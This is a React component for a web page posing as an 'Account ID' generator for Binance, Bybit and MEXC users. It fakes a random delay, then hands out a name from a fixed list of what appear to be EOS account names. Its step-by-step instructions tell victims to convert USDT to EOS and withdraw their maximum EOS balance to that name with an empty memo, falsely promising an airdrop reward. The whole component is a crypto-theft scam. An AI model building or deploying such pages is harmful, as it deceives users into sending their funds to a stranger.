import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { toast } from "sonner";
import { Copy, Loader2 } from "lucide-react";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { Label } from "@/components/ui/label";
import nicknames from "../data/nicknames.json";

const generateEOSNickname = (): string => {
  try {
    const availableNicknames = nicknames.nicknames;
    if (!Array.isArray(availableNicknames) || availableNicknames.length === 0) {
      throw new Error("No nicknames available");
    }
    return availableNicknames[Math.floor(Math.random() * availableNicknames.length)];
  } catch (error) {
    console.error("Error generating nickname:", error);
    return "5akw4hmdam4m"; // Fallback default nickname
  }
};

const exchangeScreenshots = {
  binance: [
    "/lovable-uploads/9bf3230c-0cb1-4a3a-8685-5d04c3d1c344.png",
    "/lovable-uploads/f6711426-c08e-4764-a641-d6659885dfe9.png",
    "/lovable-uploads/31ab0f34-5353-4707-a632-b509dc090686.png",
  ],
  bybit: [
    "/lovable-uploads/94b58730-9b7f-4e4f-ad9c-22a3cab74ee8.png",
    "/lovable-uploads/56cce236-34dd-476d-931a-8cd69cb0304c.png",
    "/lovable-uploads/45b3c69c-eff8-4584-b465-f4141f247681.png",
  ],
  mexc: [
    "/lovable-uploads/09765128-721f-4060-8562-e745a8dd181a.png",
    "/lovable-uploads/2fd6ec6c-2ac1-43c2-a474-68230281c2d8.png",
    "/lovable-uploads/4e491c33-872c-427d-81d5-f68832e98b84.png",
  ],
  general: [
    "/lovable-uploads/19c3b0be-f160-4b4a-b6a0-7f21005d8193.png",
    "/lovable-uploads/82500d18-59a7-4346-9890-b61b69c7e027.png",
  ]
};

export const NicknameGenerator: React.FC = () => {
  const [nickname, setNickname] = useState("");
  const [isGenerated, setIsGenerated] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [selectedExchange, setSelectedExchange] = useState<string>("");

  const handleGenerate = async () => {
    if (!selectedExchange) {
      toast.error("Please select an exchange first");
      return;
    }

    try {
      setIsLoading(true);
      // Random delay between 3-6 seconds
      const delay = Math.floor(Math.random() * (6000 - 3000 + 1) + 3000);
      await new Promise(resolve => setTimeout(resolve, delay));
      
      const newNickname = generateEOSNickname();
      setNickname(newNickname);
      setIsGenerated(true);
      toast.success("New Account ID generated!");
    } catch (error) {
      toast.error("Failed to generate nickname. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(nickname);
      toast.success("Copied to clipboard!");
    } catch (error) {
      toast.error("Failed to copy. Please try manually.");
    }
  };

  const getExchangeScreenshots = () => {
    if (selectedExchange === 'other') {
      return [...exchangeScreenshots.bybit];
    }
    return exchangeScreenshots[selectedExchange as keyof typeof exchangeScreenshots] || [];
  };

  return (
    <div className="w-full max-w-md mx-auto space-y-6 animate-fade-in px-4 sm:px-0">
      <div className="space-y-6">
        <div className="flex flex-col items-center justify-center space-y-4">
          <h3 className="text-lg font-medium text-center">Select your exchange:</h3>
          <div className="w-full max-w-[320px] mx-auto">
            <RadioGroup
              value={selectedExchange}
              onValueChange={setSelectedExchange}
              className="grid grid-cols-2 gap-6 justify-items-center"
            >
              <div className="flex items-center space-x-2">
                <RadioGroupItem value="binance" id="binance" />
                <Label htmlFor="binance" className="cursor-pointer">Binance</Label>
              </div>
              <div className="flex items-center space-x-2">
                <RadioGroupItem value="bybit" id="bybit" />
                <Label htmlFor="bybit" className="cursor-pointer">Bybit</Label>
              </div>
              <div className="flex items-center space-x-2">
                <RadioGroupItem value="mexc" id="mexc" />
                <Label htmlFor="mexc" className="cursor-pointer">Mexc</Label>
              </div>
              <div className="flex items-center space-x-2">
                <RadioGroupItem value="other" id="other" />
                <Label htmlFor="other" className="cursor-pointer">Other</Label>
              </div>
            </RadioGroup>
          </div>
        </div>

        <div className="relative">
          <Input
            value={nickname}
            readOnly
            placeholder="Click generate button"
            className="bg-muted text-lg text-center py-6"
          />
          {nickname && (
            <Button
              variant="ghost"
              size="icon"
              className="absolute right-2 top-1/2 -translate-y-1/2 hover:bg-muted"
              onClick={handleCopy}
            >
              <Copy className="h-4 w-4" />
            </Button>
          )}
        </div>
        
        <Button 
          onClick={handleGenerate}
          disabled={isLoading}
          className="w-full bg-gradient-to-r from-[#9b87f5] to-[#7E69AB] hover:opacity-90 transition-opacity disabled:opacity-50"
        >
          {isLoading ? (
            <>
              <Loader2 className="mr-2 h-4 w-4 animate-spin" />
              Generating...
            </>
          ) : (
            'Generate Account ID'
          )}
        </Button>

        {isGenerated && (
          <div className="mt-8 space-y-4 text-sm text-muted-foreground border border-muted rounded-lg p-4 animate-fade-in">
            <h3 className="font-semibold text-foreground">Instructions:</h3>
            <ol className="list-decimal list-inside space-y-4">
              <li>Convert your USDT to EOS</li>
              <li>Go to your profile in your CEX (Binance, Bybit, Bitget, Mexc, etc...)</li>
              <li>Look for an edit/set nickname</li>
              {selectedExchange && getExchangeScreenshots().map((screenshot, index) => (
                <li key={index} className="mt-2">
                  <img 
                    src={screenshot} 
                    alt={`Step ${index + 1}`}
                    className="rounded-lg border border-muted mt-2 w-full"
                  />
                </li>
              ))}
              {/* General steps shown for all exchanges */}
              {exchangeScreenshots.general.map((screenshot, index) => (
                <li key={`general-${index}`} className="mt-2">
                  <img 
                    src={screenshot} 
                    alt={`General Step ${index + 1}`}
                    className="rounded-lg border border-muted mt-2 w-full"
                  />
                </li>
              ))}
              <li>Click Save</li>
              <li>Go to your EOS balance and click withdraw</li>
              <li className="pl-4">
                a) Wallet address enter your nickname<br/>
                b) Network - EOS<br/>
                c) Memo - Empty<br/>
                d) Amount - Max
              </li>
              <li>Click on withdraw</li>
              <li>After you send yourself the EOS, you will be rewarded with 3.5-11.2% EOS token airdrop</li>
            </ol>
          </div>
        )}
      </div>
    </div>
  );
};